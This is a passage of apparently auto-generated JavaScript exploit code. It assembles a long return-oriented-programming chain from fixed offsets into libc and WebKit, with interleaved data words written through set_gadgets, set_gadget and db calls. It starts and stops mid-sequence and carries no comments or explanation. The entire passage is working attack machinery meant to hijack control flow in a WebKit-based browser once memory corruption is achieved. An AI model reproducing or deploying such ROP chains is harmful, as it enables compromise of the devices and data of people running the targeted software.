set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+144576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+144680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+144712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+144696, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+144872, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+144840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+144824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+144976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+144960, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+145184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+145288, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145272, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+145368, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+145472, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+145488, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+145648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+145600, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+145704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+145808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+145840, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+146000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+145968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+145952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146104, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146088, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+146304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146408, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146392, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+146520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+146584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+146640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+146784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+146800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+146768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+146960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+146928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+146912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+147088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147104, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+147072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147216, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147312, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+147416, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+147400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147528, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+147624, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+147712, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+147776, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+147912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+147880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+148024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+148008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([4096, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+148336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+148528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+148640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65536, 0]); 
set_gadget(libc_base+788575,); 
db([65536, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+148768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+148752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+148920, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+158912, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+149016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+149072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([65536, 0]); 
set_gadget(libc_base+788575,); 
db([65536, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+149224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+149280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+149352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472 
]);
db([312, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+149552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+149568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+149720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+149752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+149736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+149704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+149848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+149832, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+150064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+150184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+150168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+150328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+150496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+150480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+150624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+150608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([15, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+150736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+150880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+150896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+150864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+150984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+151144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+151312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+151344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+151296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+151424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+151656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+151672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+151776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+151760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+151936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+151952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+152096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+152064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+152168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+152224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+152304, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+152408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+152576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+152608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+152592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+152560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+152728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+152744, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+152712, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+152832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+152888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+152960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([40, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153104, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+153264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+153232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+153344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+153608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+153576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153592, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+153680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+153736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+153816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+153920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+153936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+154088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+154120, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+154104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+154072, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+154240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+154256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+154224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+154344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
